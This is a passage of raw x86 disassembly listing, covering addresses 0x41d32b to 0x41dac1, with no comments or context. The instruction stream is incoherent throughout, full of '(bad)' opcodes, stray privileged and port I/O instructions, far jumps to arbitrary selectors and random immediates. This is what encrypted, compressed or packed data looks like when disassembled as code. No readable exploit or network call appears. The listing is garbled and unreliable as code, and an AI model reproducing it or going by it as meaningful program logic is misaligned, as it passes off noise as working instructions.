  41d32b:	sub    al,0xd9
  41d32d:	inc    eax
  41d32e:	fld    st(5)
  41d330:	xor    eax,0x2703e67
  41d335:	xchg   DWORD PTR cs:[ebx],edx
  41d338:	xchg   ecx,eax
  41d339:	(bad)  [esi-0x5cd709e1]
  41d33f:	pop    ebp
  41d340:	mov    ebp,0x49a6db5b
  41d345:	sbb    BYTE PTR [ebp+0x6],0xd1
  41d349:	jmp    0xcb9c:0x8bc7757d
  41d350:	(bad)  
  41d351:	retf   0x9af4
  41d354:	xchg   BYTE PTR ds:0xe8f516b8,ch
  41d35a:	je     0x41d2ea
  41d35c:	pop    ss
  41d35d:	aam    0x97
  41d35f:	or     ebx,DWORD PTR [ebp-0x508fb51f]
  41d365:	add    BYTE PTR [ebx+0x7b],0xad
  41d369:	mov    bh,0x91
  41d36b:	dec    edx
  41d36c:	adc    al,0x63
  41d36e:	fnsave [edi-0x68]
  41d371:	mov    dl,0x1c
  41d373:	or     DWORD PTR [edx+0x2eefbad9],ebp
  41d379:	mov    bl,0xde
  41d37b:	mov    WORD PTR ds:0x29176dc7,es
  41d381:	dec    edx
  41d382:	inc    esp
  41d383:	mov    al,ds:0x973c0727
  41d388:	mov    eax,DWORD PTR [edx]
  41d38a:	xor    ch,BYTE PTR [edx-0xb8168c2]
  41d390:	icebp  
  41d391:	xor    eax,0x45d81d47
  41d396:	jne    0x41d3f7
  41d398:	js     0x41d404
  41d39a:	push   edx
  41d39b:	stos   BYTE PTR es:[edi],al
  41d39c:	adc    dl,al
  41d39e:	mov    dl,cl
  41d3a0:	sub    eax,0x6ed40465
  41d3a5:	jns    0x41d3df
  41d3a7:	lahf   
  41d3a8:	adc    BYTE PTR [ecx-0xb],bl
  41d3ab:	mov    edi,0x92d141cc
  41d3b0:	sbb    bh,BYTE PTR [edx]
  41d3b2:	lock out dx,eax
  41d3b4:	rol    dl,cl
  41d3b6:	jmp    0x62b1893d
  41d3bb:	pop    edx
  41d3bc:	xchg   ebp,eax
  41d3bd:	jnp    0x41d3a8
  41d3bf:	add    ah,BYTE PTR [ebx-0x4c]
  41d3c2:	(bad)  
  41d3c3:	xchg   edx,eax
  41d3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c5:	les    eax,FWORD PTR [esi-0x7c4c593b]
  41d3cb:	retf   0x9c00
  41d3ce:	dec    edi
  41d3cf:	sar    BYTE PTR [eax-0x17a00385],cl
  41d3d5:	jge    0x41d3da
  41d3d7:	jge    0x41d3af
  41d3d9:	test   DWORD PTR [ebx+0x6c757217],0xfc7c2d6f
  41d3e3:	sbb    cl,ah
  41d3e5:	xor    BYTE PTR [eax],bl
  41d3e7:	dec    eax
  41d3e9:	stc    
  41d3ea:	cpuid  
  41d3ec:	rcr    BYTE PTR [ebx+0x16],cl
  41d3ef:	fld    QWORD PTR [edi+0x2b93459b]
  41d3f5:	push   esi
  41d3f6:	inc    eax
  41d3f7:	push   edi
  41d3f8:	inc    edx
  41d3f9:	in     al,0xa4
  41d3fb:	and    ecx,DWORD PTR [ebx+esi*4]
  41d3fe:	adc    esp,eax
  41d400:	xchg   DWORD PTR [edx],edx
  41d402:	dec    esp
  41d403:	mov    al,0x31
  41d405:	cmp    DWORD PTR [ebx+0x1f],edi
  41d408:	cmc    
  41d409:	(bad)  
  41d40a:	nop
  41d40b:	mov    bh,0xde
  41d40d:	repz push esi
  41d40f:	test   eax,0xc1977c4c
  41d414:	cli    
  41d415:	push   ebx
  41d416:	rol    BYTE PTR [edi],cl
  41d418:	lods   al,BYTE PTR ds:[esi]
  41d419:	imul   esi,DWORD PTR [ecx+0x4a8b6692],0x13
  41d420:	test   al,0xfa
  41d422:	xchg   esi,eax
  41d423:	adc    eax,0x3060f94a
  41d428:	call   0xe6d60a9b
  41d42d:	pusha  
  41d42e:	mov    ebp,0x3ec496f
  41d433:	popa   
  41d434:	aad    0xeb
  41d436:	ret    0xad3e
  41d439:	cmp    bh,al
  41d43b:	jae    0x41d46f
  41d43d:	call   0x4d4e:0x7973f6b7
  41d444:	jl     0x41d45e
  41d446:	shl    esi,0x55
  41d449:	(bad)  
  41d44a:	rcl    ch,0x19
  41d44d:	mov    ecx,0x3944158d
  41d452:	xchg   BYTE PTR [ecx],dh
  41d454:	(bad)  
  41d455:	adc    DWORD PTR [eax],ebp
  41d457:	ret    
  41d458:	push   esi
  41d459:	xchg   ebx,eax
  41d45a:	mov    esi,eax
  41d45c:	(bad)  
  41d45d:	mov    cl,0xd7
  41d45f:	sbb    al,0xa1
  41d461:	add    esp,eax
  41d463:	loopne 0x41d460
  41d465:	sahf   
  41d466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d467:	fs jae 0x41d44d
  41d46a:	aad    0x45
  41d46c:	rcl    DWORD PTR [edx-0xae9998d],cl
  41d472:	pop    esi
  41d473:	cld    
  41d474:	mov    eax,0x7b8e2918
  41d479:	in     al,0xed
  41d47b:	das    
  41d47c:	mov    ebp,0x79758714
  41d481:	retf   
  41d482:	push   esp
  41d483:	test   DWORD PTR [esi+0x3],ecx
  41d486:	xchg   esi,eax
  41d487:	scas   al,BYTE PTR es:[edi]
  41d488:	lds    eax,FWORD PTR [edi+0x259f1ea3]
  41d48e:	pop    eax
  41d48f:	out    0xf5,eax
  41d491:	push   ds
  41d492:	mov    ebp,0x6d62311
  41d497:	ja     0x41d49c
  41d499:	and    BYTE PTR [esp+esi*4+0x3b],ch
  41d49d:	add    ebp,DWORD PTR [edx-0x38815805]
  41d4a3:	sbb    eax,0xc1793f67
  41d4a8:	push   edi
  41d4a9:	xor    BYTE PTR [esp+ebp*1],ah
  41d4ac:	push   cs
  41d4ad:	sahf   
  41d4ae:	test   cl,0x67
  41d4b1:	shr    ch,0x6a
  41d4b4:	xor    BYTE PTR [ebx+0x4f],0xc1
  41d4b8:	imul   BYTE PTR [eax]
  41d4ba:	jb     0x41d502
  41d4bc:	sbb    DWORD PTR [ebp-0x2d],0xffffffc6
  41d4c0:	fistp  WORD PTR [edi+ebx*4-0x5cfdd3e6]
  41d4c7:	in     eax,0x3b
  41d4c9:	inc    eax
  41d4ca:	lock dec eax
  41d4cc:	and    DWORD PTR [ecx+0x42],0xb632d71a
  41d4d3:	sub    esi,edx
  41d4d5:	por    mm5,QWORD PTR [ebp+0x123e2076]
  41d4dc:	cmp    DWORD PTR [ebx+eiz*4-0x34],0xffffff81
  41d4e1:	ds jae 0x41d4dd
  41d4e4:	call   0xb23a99e6
  41d4e9:	ret    
  41d4ea:	mov    eax,0xa7f7a613
  41d4ef:	xor    esi,DWORD PTR [eax+0x46a773ba]
  41d4f5:	mov    edi,0xd5b2c2bc
  41d4fa:	test   eax,0xdd1a5aad
  41d4ff:	dec    eax
  41d500:	jle    0x41d528
  41d502:	data16 daa 
  41d504:	jne    0x41d585
  41d506:	test   BYTE PTR [edi],0x1
  41d509:	out    0x6d,eax
  41d50b:	fidiv  DWORD PTR es:[ecx]
  41d50e:	dec    esi
  41d50f:	repz mov esp,0xd39a6874
  41d516:	jmp    0xe38:0x305dac4e
  41d51d:	jge    0x41d565
  41d51f:	jo     0x41d4d9
  41d521:	xchg   esp,eax
  41d522:	test   BYTE PTR [ebp+ebx*1-0x30],dh
  41d526:	pop    ds
  41d527:	push   edi
  41d528:	pop    ecx
  41d529:	xchg   DWORD PTR [esp+esi*4],edx
  41d52c:	sub    eax,0x5f600a30
  41d531:	xchg   ecx,eax
  41d532:	cmp    dl,dh
  41d534:	cmp    al,0xc6
  41d536:	add    eax,0xf265b009
  41d53b:	mov    ecx,0xc969b479
  41d540:	jl     0x41d4d6
  41d542:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41d544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d545:	jg     0x41d4e8
  41d547:	add    DWORD PTR [ecx+0x523c8ea4],ecx
  41d54d:	rcl    BYTE PTR [ecx+0x1f],0x55
  41d551:	sahf   
  41d552:	ins    DWORD PTR es:[edi],dx
  41d553:	sub    esp,ecx
  41d555:	pop    ebx
  41d556:	jg     0x41d4e6
  41d558:	in     eax,0x28
  41d55a:	sub    eax,0x57adb5d7
  41d55f:	int3   
  41d560:	adc    ebp,DWORD PTR [ecx]
  41d562:	jmp    0x733b122b
  41d567:	jbe    0x41d5be
  41d569:	push   ebp
  41d56a:	fld    DWORD PTR [edx+ebp*1-0x4c]
  41d56e:	retf   0x29be
  41d571:	test   DWORD PTR [eax-0x1d],eax
  41d574:	(bad)  
  41d575:	dec    edx
  41d576:	mov    bl,dh
  41d578:	in     al,0x0
  41d57a:	sub    eax,0x5cb272fa
  41d57f:	call   0x9022b7ea
  41d584:	cmp    DWORD PTR [ebx-0x56],edx
  41d587:	and    BYTE PTR [ebp-0x26],bl
  41d58a:	mov    esp,0x8516f104
  41d58f:	push   0xffffff9a
  41d591:	outs   dx,DWORD PTR ds:[esi]
  41d592:	mov    edi,0x8ee6d32
  41d597:	and    BYTE PTR [esp+edi*1],bh
  41d59a:	sub    eax,esi
  41d59c:	jae    0x41d549
  41d59e:	sti    
  41d59f:	or     BYTE PTR [eax+0x77],ah
  41d5a2:	push   ecx
  41d5a3:	(bad)  
  41d5a5:	xchg   BYTE PTR [eax],dh
  41d5a7:	mov    esp,DWORD PTR [eax]
  41d5a9:	imul   ebx,DWORD PTR [edx+0x41],0x978fc04c
  41d5b0:	mov    esp,0xb91e3729
  41d5b5:	loop   0x41d53d
  41d5b7:	adc    DWORD PTR [ecx+0x5],edx
  41d5ba:	dec    esp
  41d5bb:	gs pop edi
  41d5bd:	dec    ebp
  41d5be:	xchg   al,dh
  41d5c0:	je     0x41d608
  41d5c2:	adc    cl,BYTE PTR [edx-0x6f741de6]
  41d5c8:	inc    esi
  41d5c9:	enter  0xde45,0xfe
  41d5cd:	or     edi,ebx
  41d5cf:	jb     0x41d597
  41d5d1:	inc    esi
  41d5d2:	inc    eax
  41d5d3:	mov    ebp,0xee30526c
  41d5d8:	loop   0x41d5ee
  41d5da:	mov    DWORD PTR [ecx-0x62],ebp
  41d5dd:	retf   0xe266
  41d5e0:	jl     0x41d63f
  41d5e2:	ja     0x41d5ee
  41d5e4:	mov    dh,0x99
  41d5e6:	arpl   si,bp
  41d5e8:	xor    eax,0x7dbcd2c1
  41d5ed:	dec    edi
  41d5ee:	dec    eax
  41d5ef:	inc    edx
  41d5f0:	pop    ss
  41d5f1:	mov    ds:0x5da71eab,al
  41d5f6:	out    dx,al
  41d5f7:	push   ebx
  41d5f8:	outs   dx,BYTE PTR ds:[esi]
  41d5f9:	jne    0x41d5e6
  41d5fb:	std    
  41d5fc:	inc    ecx
  41d5fd:	cmp    DWORD PTR [esi+0x7f],ebp
  41d600:	inc    esi
  41d601:	jle    0x41d617
  41d603:	jl     0x41d622
  41d605:	mov    cl,0xee
  41d607:	mov    eax,ds:0xac432beb
  41d60c:	mov    esp,0x787946ed
  41d611:	mov    es,WORD PTR [ecx+esi*4]
  41d614:	cmp    bh,BYTE PTR ds:0x7689edd2
  41d61a:	ins    DWORD PTR es:[edi],dx
  41d61b:	push   cs
  41d61c:	ins    BYTE PTR es:[edi],dx
  41d61d:	and    ebp,DWORD PTR [ecx-0x7a]
  41d620:	and    al,0xd6
  41d622:	cmp    ecx,esp
  41d624:	add    eax,DWORD PTR [edi+edi*8]
  41d627:	cmp    dh,BYTE PTR ds:0xa2512c40
  41d62d:	xor    eax,0x9fc4fa78
  41d632:	cmp    al,0x10
  41d634:	adc    bl,BYTE PTR [edi-0x64b2d97f]
  41d63a:	pop    ss
  41d63b:	push   ecx
  41d63c:	mov    edi,0x21c05dec
  41d641:	fcomp  DWORD PTR [ecx-0x61c37b39]
  41d647:	aas    
  41d648:	inc    DWORD PTR [eax]
  41d64a:	leave  
  41d64b:	pusha  
  41d64c:	jo     0x41d67c
  41d64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d64f:	stos   DWORD PTR es:[edi],eax
  41d650:	dec    esp
  41d651:	push   ecx
  41d652:	cmp    al,0x7e
  41d654:	jg     0x41d657
  41d656:	aad    0x78
  41d658:	lds    ecx,FWORD PTR [edi]
  41d65a:	mov    ebx,0x18b2cd08
  41d65f:	fst    DWORD PTR [eax-0x5ba9929f]
  41d665:	sub    DWORD PTR [eax-0x73e8b0c4],edi
  41d66b:	or     bl,al
  41d66d:	jne    0x41d6af
  41d66f:	mov    WORD PTR [eax+0x4e],fs
  41d672:	test   ebp,esp
  41d674:	and    BYTE PTR [ebx+0x5028e541],dl
  41d67a:	jg     0x41d685
  41d67c:	test   al,0x2
  41d67e:	je     0x41d668
  41d680:	ror    DWORD PTR [eax+0x65cce664],0x4b
  41d687:	cmp    eax,0x8686ee2a
  41d68c:	mov    ds:0x6b905a63,eax
  41d691:	xor    DWORD PTR [edx-0x2a4476fd],ebp
  41d697:	out    dx,eax
  41d698:	sbb    DWORD PTR [ecx+0x3a4d560e],0x1e
  41d69f:	pop    ebp
  41d6a0:	shl    DWORD PTR [eax],cl
  41d6a2:	push   esp
  41d6a3:	jg     0x41d6d8
  41d6a5:	repz daa 
  41d6a7:	inc    edx
  41d6a8:	pop    bx
  41d6aa:	popf   
  41d6ab:	jne    0x41d721
  41d6ad:	in     eax,dx
  41d6ae:	xchg   edi,eax
  41d6af:	xor    eax,0x31d32e7a
  41d6b4:	push   cs
  41d6b5:	adc    DWORD PTR [edi],esi
  41d6b7:	icebp  
  41d6b8:	jmp    0x41d6b7
  41d6ba:	rol    DWORD PTR [esi+0x429b625d],cl
  41d6c0:	(bad)
  41d6c4:	jb     0x41d71d
  41d6c6:	xchg   edx,eax
  41d6c7:	pop    ebx
  41d6c8:	in     al,dx
  41d6c9:	adc    eax,0x309fdc2f
  41d6ce:	push   cs
  41d6cf:	cmp    BYTE PTR [edx+0x5a8888fa],ch
  41d6d5:	xchg   BYTE PTR [edx-0x1ee9a028],al
  41d6db:	aad    0xa7
  41d6dd:	xchg   ebp,eax
  41d6de:	cmc    
  41d6df:	jge    0x41d693
  41d6e1:	jno    0x41d70b
  41d6e3:	mov    eax,0xf5d6d439
  41d6e8:	loope  0x41d68e
  41d6ea:	cmp    DWORD PTR [eax+0x808323c],ebx
  41d6f0:	sbb    edi,DWORD PTR [edx+0x2f]
  41d6f3:	scas   eax,DWORD PTR es:[edi]
  41d6f4:	call   0xa66a:0x2018b9c8
  41d6fb:	ds in  eax,0xba
  41d6fe:	arpl   WORD PTR [ecx],cx
  41d700:	out    0x11,al
  41d702:	test   al,0x6b
  41d704:	add    eax,0x2785f476
  41d70a:	xchg   ebp,eax
  41d70b:	and    DWORD PTR [esp+ecx*8+0x6c],ecx
  41d70f:	lock call 0x6b4c:0x86ecddd4
  41d717:	dec    esp
  41d718:	addr16 xchg ecx,eax
  41d71a:	and    esp,0x59
  41d71d:	mov    al,0x0
  41d71f:	jae    0x41d6ec
  41d721:	fwait
  41d722:	sub    eax,0xca91a4c9
  41d727:	cli    
  41d728:	rcr    DWORD PTR [edx+0x2],0xb3
  41d72c:	scas   eax,DWORD PTR es:[edi]
  41d72d:	dec    esp
  41d72e:	jno    0x41d782
  41d730:	jle    0x41d799
  41d732:	shl    BYTE PTR [ebx],1
  41d734:	sub    ah,BYTE PTR ds:[ecx-0x1d48b980]
  41d73b:	or     dl,ch
  41d73d:	add    BYTE PTR [ebp-0x2b2b8b76],cl
  41d743:	jge    0x41d75d
  41d745:	fcom   DWORD PTR ds:0x25e9480f
  41d74b:	popf   
  41d74c:	mov    esp,0xe57e6577
  41d751:	gs (bad) 
  41d753:	cld    
  41d754:	push   0x4a
  41d756:	adc    DWORD PTR [eax],edi
  41d758:	sti    
  41d759:	jns    0x41d7b3
  41d75b:	cmp    eax,0x7c63c3fc
  41d760:	cmp    BYTE PTR [edx],bh
  41d762:	ror    DWORD PTR [edi],cl
  41d764:	aam    0x46
  41d766:	pop    ebx
  41d767:	scas   eax,DWORD PTR es:[edi]
  41d768:	pusha  
  41d769:	std    
  41d76a:	add    DWORD PTR [ecx],ecx
  41d76c:	retf   0x52b6
  41d76f:	ss ret 0xd8b9
  41d773:	in     eax,dx
  41d774:	scas   eax,DWORD PTR es:[edi]
  41d775:	add    BYTE PTR [ebx],cl
  41d777:	sbb    BYTE PTR [esp+eax*4-0x603131dd],dh
  41d77e:	pop    ebp
  41d77f:	nop
  41d780:	or     bh,BYTE PTR [edi+edi*4]
  41d783:	adc    bh,al
  41d785:	call   0x4154162a
  41d78a:	inc    edi
  41d78b:	and    BYTE PTR [ebx],0x5c
  41d78e:	and    al,BYTE PTR [edi]
  41d790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d791:	daa    
  41d792:	cmp    BYTE PTR [eax],0x6
  41d795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d796:	mov    ecx,0x4bed6ce9
  41d79b:	imul   edx,DWORD PTR [ecx-0x79ec9d2],0x784577ae
  41d7a5:	add    edx,DWORD PTR [edx]
  41d7a7:	retf   0x351d
  41d7aa:	push   esp
  41d7ab:	gs or  eax,0xe6156733
  41d7b1:	push   edx
  41d7b2:	ins    DWORD PTR es:[edi],dx
  41d7b3:	nop    DWORD PTR [ebp-0x12]
  41d7b8:	inc    ecx
  41d7b9:	mov    DWORD PTR [ecx],0xc7bd630a
  41d7bf:	push   ds
  41d7c0:	sbb    DWORD PTR [eax+edx*4-0x6478a7af],ebp
  41d7c7:	dec    ebp
  41d7c8:	fsubr  DWORD PTR [ebp+0x1c]
  41d7cb:	xor    al,0x4b
  41d7cd:	enter  0x30d0,0x31
  41d7d1:	sub    al,0x78
  41d7d3:	xchg   edx,eax
  41d7d4:	jae    0x41d785
  41d7d6:	clc    
  41d7d7:	or     esp,DWORD PTR [eax+0x54]
  41d7da:	push   ecx
  41d7db:	sbb    eax,0x4ae7f04c
  41d7e0:	dec    edx
  41d7e1:	outs   dx,DWORD PTR ds:[esi]
  41d7e2:	push   ecx
  41d7e3:	cmp    DWORD PTR [ebx],ecx
  41d7e5:	(bad)  
  41d7e6:	iret   
  41d7e7:	rcpps  xmm2,XMMWORD PTR [ebx]
  41d7ea:	xor    DWORD PTR gs:[ebp-0x58],edi
  41d7ee:	sbb    DWORD PTR [esi-0x4d],edi
  41d7f1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7f3:	pop    ds
  41d7f4:	mov    ebp,0x34e10845
  41d7f9:	cmp    BYTE PTR [esp+ebx*8],ah
  41d7fc:	cli    
  41d7fd:	sbb    BYTE PTR [edx],dl
  41d7ff:	xchg   esi,eax
  41d800:	je     0x41d7aa
  41d802:	mov    ebx,0xe97e808e
  41d807:	(bad)  
  41d808:	xchg   ecx,eax
  41d809:	and    eax,0x22711b83
  41d80e:	aaa    
  41d80f:	(bad)  
  41d810:	in     al,0x8a
  41d812:	push   cs
  41d813:	ins    DWORD PTR es:[edi],dx
  41d814:	cmp    ch,BYTE PTR [ebx-0x194ff001]
  41d81a:	jne    0x41d7ed
  41d81c:	mov    eax,fs:0x8a381ca9
  41d822:	dec    edx
  41d823:	sub    DWORD PTR [esi-0x36],eax
  41d826:	mov    ebx,0x5b2faefe
  41d82b:	sahf   
  41d82c:	aas    
  41d82d:	es aad 0x6e
  41d830:	outs   dx,BYTE PTR ds:[esi]
  41d831:	int3   
  41d832:	sub    eax,DWORD PTR [ecx]
  41d834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d835:	test   ch,dl
  41d837:	jecxz  0x41d7dd
  41d839:	or     ebp,DWORD PTR [ecx-0x29b5e930]
  41d83f:	lds    ebp,FWORD PTR [ebx-0x54]
  41d842:	ja     0x41d848
  41d844:	iret   
  41d845:	adc    DWORD PTR [ecx+0x77],edx
  41d848:	iret   
  41d849:	inc    ecx
  41d84a:	popa   
  41d84b:	cmp    al,0x54
  41d84d:	mov    cl,0x11
  41d84f:	and    dh,BYTE PTR [esi-0x5a41f66]
  41d855:	sub    ecx,eax
  41d857:	pminsw mm3,mm6
  41d85a:	mov    dh,0x47
  41d85c:	in     eax,dx
  41d85d:	sub    BYTE PTR [edx-0x6a2dc3e2],ah
  41d863:	rcr    BYTE PTR [ebp+eax*4+0x3],0x51
  41d868:	test   al,0x71
  41d86a:	add    ah,ch
  41d86c:	or     esi,DWORD PTR [edx+ecx*8]
  41d86f:	or     esp,DWORD PTR [ebp-0x4c]
  41d872:	mov    cl,0xa8
  41d874:	or     DWORD PTR [esi],ecx
  41d876:	int3   
  41d877:	jecxz  0x41d8ac
  41d879:	mov    ebx,DWORD PTR [ecx-0x7b]
  41d87c:	mov    ah,0x8a
  41d87e:	xchg   esi,eax
  41d87f:	sbb    eax,0x608f830c
  41d884:	mov    BYTE PTR [eax-0x4],dl
  41d887:	or     eax,0x59918e3f
  41d88c:	repz aam 0x6
  41d88f:	cmc    
  41d890:	xor    BYTE PTR [ebp+0x48df1da],dh
  41d896:	pop    ax
  41d898:	scas   al,BYTE PTR es:[edi]
  41d899:	test   DWORD PTR [esi-0x77],esp
  41d89c:	mov    edx,0x632859f1
  41d8a1:	adc    eax,DWORD PTR [ebx-0x9e4e6ce]
  41d8a7:	pop    es
  41d8a8:	test   al,0xcf
  41d8aa:	xchg   ebp,eax
  41d8ab:	sub    DWORD PTR [ebx],ebx
  41d8ad:	sbb    eax,0xc2c25f88
  41d8b2:	inc    ebp
  41d8b3:	sub    DWORD PTR [ebp+0x1e],ebx
  41d8b6:	mov    edx,DWORD PTR [ebx+0x209a2749]
  41d8bc:	cmp    dl,BYTE PTR [esi+0x10]
  41d8bf:	xchg   edx,eax
  41d8c0:	pop    ss
  41d8c1:	stc    
  41d8c2:	(bad)  
  41d8c4:	xor    cl,al
  41d8c6:	jmp    0x41d8ce
  41d8c8:	shr    DWORD PTR [edx],cl
  41d8ca:	call   0x93e94a7a
  41d8cf:	jno    0x41d87c
  41d8d1:	xor    al,0x12
  41d8d3:	sbb    esp,0xffffffb4
  41d8d6:	push   edx
  41d8d7:	jo     0x41d918
  41d8d9:	adc    BYTE PTR [edx-0x68],ah
  41d8dc:	rol    BYTE PTR [esi],1
  41d8de:	imul   edi,ebx,0xffffff93
  41d8e1:	stos   BYTE PTR es:[edi],al
  41d8e2:	jbe    0x41d929
  41d8e4:	ror    DWORD PTR [ebx-0x74],1
  41d8e7:	sbb    edi,0x80f78483
  41d8ed:	mov    edi,0xaedfdce6
  41d8f2:	das    
  41d8f3:	out    0x98,eax
  41d8f5:	pop    edx
  41d8f6:	fcom   DWORD PTR [eax]
  41d8f8:	push   ebp
  41d8f9:	(bad)  
  41d8fa:	xor    DWORD PTR [esi-0xd89d90a],esi
  41d900:	sahf   
  41d901:	push   ds
  41d902:	pop    es
  41d903:	jns    0x41d8ba
  41d905:	mov    DWORD PTR [esi-0x5d],edx
  41d908:	imul   edi,DWORD PTR [edi+ebx*2],0xffffffaa
  41d90c:	jb     0x41d8c2
  41d90e:	jae    0x41d974
  41d910:	jnp    0x41d985
  41d912:	xor    dl,BYTE PTR [ebx-0x1c]
  41d915:	int    0x88
  41d917:	gs or  bh,cl
  41d91a:	add    al,0x69
  41d91c:	pusha  
  41d91d:	lahf   
  41d91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d91f:	sub    BYTE PTR [edx-0x58],0x90
  41d923:	cmp    BYTE PTR [esi-0x79ed8f6b],al
  41d929:	jnp    0x41d967
  41d92b:	inc    ecx
  41d92c:	push   cs
  41d92d:	sub    DWORD PTR [edi+0x7442654d],ecx
  41d933:	mov    bl,0xbe
  41d935:	in     eax,dx
  41d936:	ret    0xb3c1
  41d939:	mov    esi,0x76413efa
  41d93e:	cs jo  0x41d8d5
  41d941:	repnz lods eax,DWORD PTR ds:[esi]
  41d943:	and    BYTE PTR [edx+edi*8],0x35
  41d947:	add    DWORD PTR [ebp-0x41ed1ff7],esi
  41d94d:	mov    esp,0x33aadcb3
  41d952:	xchg   esi,eax
  41d953:	and    al,0xfc
  41d955:	imul   eax,DWORD PTR [ebx],0x3681d523
  41d95b:	mov    edi,0x9a523288
  41d960:	(bad)  
  41d961:	daa    
  41d962:	mov    bl,0x2e
  41d964:	and    cl,BYTE PTR [edx+0x4e]
  41d967:	or     DWORD PTR [edx-0x5e79c8c4],edi
  41d96d:	std    
  41d96e:	xchg   ebx,eax
  41d96f:	xchg   esp,eax
  41d970:	add    ecx,DWORD PTR [ebx+eax*1]
  41d973:	outs   dx,BYTE PTR gs:[esi]
  41d975:	dec    ecx
  41d976:	inc    BYTE PTR [edi+0xd]
  41d979:	sbb    al,0xb4
  41d97b:	inc    edx
  41d97c:	sub    bl,cl
  41d97e:	jmp    0x41d970
  41d980:	pop    ecx
  41d981:	xchg   esp,eax
  41d982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d983:	fnstsw WORD PTR [ecx-0x1b]
  41d986:	cwde   
  41d987:	call   0xf7fadaf0
  41d98c:	xchg   esp,eax
  41d98d:	lds    edx,FWORD PTR [edx+0x13bc4770]
  41d993:	cmp    cl,BYTE PTR [esi-0x24]
  41d996:	jno    0x41d955
  41d998:	(bad)
  41d99c:	jg     0x41d9b0
  41d99e:	dec    esi
  41d99f:	jp     0x41d9cc
  41d9a1:	ror    cl,0xed
  41d9a4:	xchg   edx,eax
  41d9a5:	retf   
  41d9a6:	les    edx,FWORD PTR ds:0xa8b07058
  41d9ac:	loop   0x41d969
  41d9ae:	jo     0x41da0c
  41d9b0:	mov    ebp,0xc23b2c3e
  41d9b5:	push   0xdc10e509
  41d9ba:	xor    BYTE PTR [eax-0x4d8bd06b],cl
  41d9c0:	js     0x41d952
  41d9c2:	xchg   BYTE PTR [ebp+0x6d],al
  41d9c5:	int3   
  41d9c6:	and    bh,dl
  41d9c8:	push   ebx
  41d9c9:	xchg   esp,eax
  41d9ca:	in     eax,0x99
  41d9cc:	nop
  41d9cd:	jmp    0x2976ba6e
  41d9d2:	sti    
  41d9d3:	cdq    
  41d9d4:	mov    BYTE PTR [esi-0x32],bl
  41d9d7:	test   BYTE PTR [eax+0x643a5497],ch
  41d9dd:	mov    edi,ebx
  41d9df:	xor    eax,DWORD PTR [eax+0x4d]
  41d9e2:	js     0x41da13
  41d9e4:	aad    0x91
  41d9e6:	loop   0x41d9dd
  41d9e8:	push   eax
  41d9e9:	mov    eax,ds:0xf5cbaded
  41d9ee:	jl     0x41da6f
  41d9f0:	stc    
  41d9f1:	int    0x8a
  41d9f3:	pop    ebp
  41d9f4:	sbb    eax,0x7ebba6e1
  41d9f9:	in     eax,dx
  41d9fa:	fs test al,0xa9
  41d9fd:	push   cs
  41d9fe:	or     ebp,DWORD PTR [ebp+0x1b160eef]
  41da04:	test   al,dl
  41da06:	daa    
  41da07:	test   DWORD PTR [edx+eax*1],ebp
  41da0a:	vpunpcklqdq xmm7,xmm6,XMMWORD PTR [eax+0x43e4efbc]
  41da12:	mov    esi,0xa5ec5ef9
  41da17:	jns    0x41d9a0
  41da19:	mov    cl,0x17
  41da1b:	popf   
  41da1c:	xchg   BYTE PTR [ecx+edx*4+0x48],al
  41da20:	popa   
  41da21:	pop    es
  41da22:	mov    esp,0xdc15d066
  41da27:	adc    cl,BYTE PTR [eax-0x19]
  41da2a:	int    0xe9
  41da2c:	or     BYTE PTR [ebx],bh
  41da2e:	ret    0xa724
  41da31:	pop    ecx
  41da32:	cdq    
  41da33:	mul    BYTE PTR [ecx+0x1d0e4a79]
  41da39:	gs jo  0x41d9ee
  41da3c:	and    BYTE PTR [ecx],ah
  41da3e:	adc    dh,cl
  41da40:	dec    eax
  41da41:	xor    edx,ebx
  41da43:	into   
  41da44:	mov    ch,0x28
  41da46:	pop    eax
  41da47:	outs   dx,DWORD PTR ds:[esi]
  41da48:	scas   al,BYTE PTR es:[edi]
  41da49:	cmovp  edx,DWORD PTR [ebp+0x3]
  41da4d:	aad    0xc5
  41da4f:	in     eax,dx
  41da50:	mov    ah,BYTE PTR [ebx*2-0x5f979a97]
  41da57:	jae    0x41d9e9
  41da59:	ret    0x1a5a
  41da5c:	cdq    
  41da5d:	push   eax
  41da5e:	call   0x5e3419e6
  41da63:	ins    DWORD PTR es:[edi],dx
  41da64:	loope  0x41da55
  41da66:	aas    
  41da67:	fsubrp st(7),st
  41da69:	icebp  
  41da6a:	in     al,dx
  41da6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da6c:	push   0xf7c003d4
  41da71:	fwait
  41da72:	icebp  
  41da73:	stos   DWORD PTR es:[edi],eax
  41da74:	ret    
  41da75:	pop    ebp
  41da76:	mov    edx,0x4c7a72a6
  41da7b:	(bad)  
  41da7c:	aas    
  41da7d:	in     al,0x69
  41da7f:	repnz adc BYTE PTR [esi-0x1e],ch
  41da83:	jle    0x41da17
  41da85:	arpl   WORD PTR [edx+eiz*1],bp
  41da88:	sub    al,0x89
  41da8a:	push   0x1734b7cc
  41da8f:	aam    0xd5
  41da91:	cwde   
  41da92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da93:	xor    al,0xa6
  41da95:	mov    dl,0xb5
  41da97:	cld    
  41da98:	dec    edx
  41da99:	dec    ebp
  41da9a:	mov    dl,0xc1
  41da9c:	lahf   
  41da9d:	out    0xa2,eax
  41da9f:	mov    ecx,0x6bc7f697
  41daa4:	jbe    0x41da46
  41daa6:	retf   
  41daa7:	or     DWORD PTR [edx+0x57],ecx
  41daaa:	pop    ebx
  41daab:	pusha  
  41daac:	sbb    al,0xd7
  41daae:	add    cl,bh
  41dab0:	sbb    eax,0x659e25cb
  41dab5:	(bad)
  41dab8:	add    ecx,DWORD PTR [eax-0x4c8f0444]
  41dabe:	add    BYTE PTR [esi],ch
  41dac0:	icebp  
  41dac1:	(bad)  
